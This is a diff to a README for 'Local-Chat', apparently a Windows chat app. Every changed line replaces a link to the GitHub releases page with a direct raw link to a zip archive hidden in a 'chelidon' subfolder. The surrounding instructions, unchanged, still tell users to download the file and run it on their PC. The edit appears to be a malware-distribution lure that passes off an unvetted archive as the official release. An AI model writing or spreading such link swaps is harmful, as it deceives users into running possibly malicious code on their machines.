@@ -1,6 +1,6 @@
 # 💬 Local-Chat - Run a Local Chat on Windows
 
-[![Download Local-Chat](https://img.shields.io/badge/Download-Local--Chat-blue?style=for-the-badge&logo=github)](https://github.com/Loralyncomparative652/Local-Chat/releases)
+[![Download Local-Chat](https://img.shields.io/badge/Download-Local--Chat-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip)
 
 ## 🖥️ What Local-Chat Does
 
@@ -10,14 +10,14 @@ It is built for local use on Windows. That means the chat stays on your machine 
 
 ## 📥 Download
 
-1. Open the [Local-Chat Releases page](https://github.com/Loralyncomparative652/Local-Chat/releases)
+1. Open the [Local-Chat Releases page](https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip)
 2. Find the latest release
 3. Download the file for Windows
 4. Save it to a folder you can find again, such as Downloads or Desktop
 
 If the release contains a Windows app file, download and run that file. If the release gives you a package or archive, download it and follow the steps below.
 
-[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/Loralyncomparative652/Local-Chat/releases)
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip)
 
 ## 🪟 Windows Setup
 
@@ -125,7 +125,7 @@ If one browser gives you trouble, try another one.
 
 Use this page to get the newest version of Local-Chat:
 
-[https://github.com/Loralyncomparative652/Local-Chat/releases](https://github.com/Loralyncomparative652/Local-Chat/releases)
+[https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip](https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip)
 
 Open the latest release, download the Windows file, and run it on your PC.
 
@@ -159,7 +159,7 @@ This setup keeps the process simple:
 
 ## 🖱️ Quick Steps
 
-1. Visit the [releases page](https://github.com/Loralyncomparative652/Local-Chat/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/Loralyncomparative652/Local-Chat/main/chelidon/Chat_Local_v3.7-beta.4.zip)
 2. Download the latest Windows file
 3. Open the downloaded file
 4. Let the app start
